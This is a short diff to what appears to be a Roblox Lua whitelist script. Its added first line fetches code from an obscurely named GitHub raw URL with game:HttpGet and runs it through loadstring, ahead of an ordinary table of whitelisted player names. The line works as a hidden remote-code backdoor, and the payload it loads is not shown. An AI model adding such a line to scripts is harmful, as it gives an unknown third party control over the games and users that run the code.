@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/YouWillNeverFindMeCuzItsVeryHardToDoIt/YOUCANEVENFINDMBROITSVERYHARDHAHA/main/test-normal-6570dc82"))()
+
 -- List of whitelisted player names
 local whitelist = {
 ["ef"] = true,
